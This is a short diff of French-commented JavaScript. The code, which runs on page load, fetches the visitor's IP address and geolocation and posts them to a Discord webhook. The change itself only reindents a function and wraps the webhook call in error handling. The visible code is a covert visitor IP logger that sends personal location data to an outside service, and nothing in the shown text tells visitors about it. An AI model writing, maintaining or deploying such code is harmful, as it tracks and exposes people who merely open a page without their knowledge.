@@ -27,7 +27,7 @@
             return data;
         };
 
-        const sendWebhookWithMessage = async () => {
+const sendWebhookWithMessage = async () => {
     const ipAddress = await getIpAddress();
     const ipGeolocationData = await getIpGeolocation(ipAddress);
 
@@ -87,9 +87,14 @@
         ]
     };
 
-    // Envoie du message via le webhook Discord
-    await sendWebhook(embed);
+    try {
+        // Envoie du message via le webhook Discord
+        await sendWebhook(embed);
+    } catch (error) {
+        console.error(error);
+    }
 };
 
 // Appelle la fonction au chargement de la page
 sendWebhookWithMessage();
+
